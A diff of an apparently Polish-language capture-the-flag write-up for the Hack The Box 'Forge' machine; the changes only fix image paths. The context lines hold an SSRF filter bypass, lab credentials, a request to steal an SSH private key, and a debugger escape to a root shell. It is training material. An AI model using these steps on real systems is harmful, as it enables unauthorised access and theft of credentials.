@@ -277,31 +277,31 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <span style="color:#ae81ff">301</span>        4l       24w      224c http://forge.htb/uploads
 </code></pre></div><hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210916190928.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210916190928.png" alt=""  />
 </p>
 <hr>
 <h1 id="subdomain-enumeration">Subdomain Enumeration<a hidden class="anchor" aria-hidden="true" href="#subdomain-enumeration">#</a></h1>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://forge.htb -o subdomains.txt
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210917200851.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210917200851.png" alt=""  />
 </p>
 <p>Dodaje <code>admin.forge.htb</code> do /etc/hosts</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210917200945.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210917200945.png" alt=""  />
 </p>
 <hr>
 <h1 id="versions">Versions<a hidden class="anchor" aria-hidden="true" href="#versions">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210917212051.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210917212051.png" alt=""  />
 </p>
 <p>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3</p>
 <hr>
 <h1 id="ssrf">SSRF<a hidden class="anchor" aria-hidden="true" href="#ssrf">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210918233410.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210918233410.png" alt=""  />
 </p>
 <p>Użytkownicy spoza sieci nie mają dostępu, czy na pewno?</p>
 <p><a href="https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b">https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b</a></p>
 <p>Url encoding, każda litera do hex z %</p>
 <p>http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62	= http://localhost</p>
 <p>http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/announcements	= http://localhost/annoucements</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210918233240.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210918233240.png" alt=""  />
 </p>
 <p><code>user:heightofsecurity123!</code></p>
 <p>?u=&lt;url&gt;</p>
@@ -317,9 +317,9 @@ be16212b32110b8cf52778cc09d29040
 <p><code>be16212b32110b8cf52778cc09d29040</code></p>
 <h2 id="getting-id_rsa">Getting id_rsa<a hidden class="anchor" aria-hidden="true" href="#getting-id_rsa">#</a></h2>
 <h2 id="http61646d696e2e666f7267652e687462uploaduftpuserheightofsecurity12361646d696e2e666f7267652e687462sshid_rsa">http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/upload?u=ftp://user:heightofsecurity123!@%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/.ssh/id_rsa<a hidden class="anchor" aria-hidden="true" href="#http61646d696e2e666f7267652e687462uploaduftpuserheightofsecurity12361646d696e2e666f7267652e687462sshid_rsa">#</a></h2>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210920172735.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210920172735.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210920172817.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210920172817.png" alt=""  />
 </p>
 <hr>
 <h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
@@ -331,10 +331,10 @@ Matching Defaults entries <span style="color:#66d9ef">for</span> user on forge:
 User user may run the following commands on forge:
     <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
 </code></pre></div><p>Jest to aplikacja do wyswielania roznych komend</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210920180657.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210920180657.png" alt=""  />
 </p>
 <p>Gdy zostało wpisane cokolwiek poza 1-4, program uruchomił się ponownie. Wpisanie litery wyrzuciło błąd, ale uzyskany zosstał dostęp do debuggera</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210920180758.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210920180758.png" alt=""  />
 </p>
 <p>A tam bardzo łatwo można uzyskać roota poprzez komende poniżej, bo program uruchomiony został z sudo</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">import os; os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>
